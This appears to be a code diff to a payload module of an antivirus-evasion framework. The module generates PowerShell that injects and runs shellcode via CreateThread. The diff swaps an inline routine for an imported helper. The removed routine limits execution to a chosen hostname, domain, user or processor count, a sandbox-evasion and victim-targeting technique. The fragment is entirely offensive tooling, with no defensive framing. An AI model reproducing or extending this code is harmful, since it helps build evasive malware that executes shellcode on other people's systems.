@@ -14,6 +14,7 @@ Port to the msf resource file by @harmj0y
 
 
 from Tools.Evasion.evasion_common import evasion_helpers
+from Tools.Evasion.evasion_common import gamemaker
 from Tools.Evasion.evasion_common import shellcode_help
 
 
@@ -49,7 +50,7 @@ class PayloadModule:
 
     def psRaw(self):
 
-        checks, num_ends = self.system_checks()
+        checks, num_ends = gamemaker.senecas_games(self)
         # Generate the shellcode
         if not self.cli_shellcode:
             Shellcode = self.shellcode.generate(self.cli_opts)
@@ -94,28 +95,6 @@ $z=$o::CreateThread(0,0,$ct,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)
         baseString += '}\n' * num_ends
 
         return baseString
-
-    def system_checks(self):
-        check_code = ''
-        num_ends_required = 0
-
-        if self.required_options["HOSTNAME"][0].lower() != "x":
-            check_code += "if($env:computername -eq \"" + self.required_options["HOSTNAME"][0].lower() + "\") {\n"
-            num_ends_required += 1
-
-        if self.required_options["DOMAIN"][0].lower() != "x":
-            check_code += "if((Get-WMIObject -Class Win32_ComputerSystem).Domain -eq \"" + self.required_options["DOMAIN"][0].lower() + "\") {\n"
-            num_ends_required += 1
-
-        if self.required_options["USERNAME"][0].lower() != "x":
-            check_code += "if($env:username -eq \"" + self.required_options["USERNAME"][0].lower() + "\") {\n"
-            num_ends_required += 1
-
-        if self.required_options["PROCESSORS"][0].lower() != "x":
-            check_code += "if((Get-WMIObject -Class Win32_Processor).NumberOfLogicalProcessors -ge " + self.required_options["PROCESSORS"][0].lower() + ") {\n"
-            num_ends_required += 1
-
-        return check_code, num_ends_required
 
     def generate(self):
 
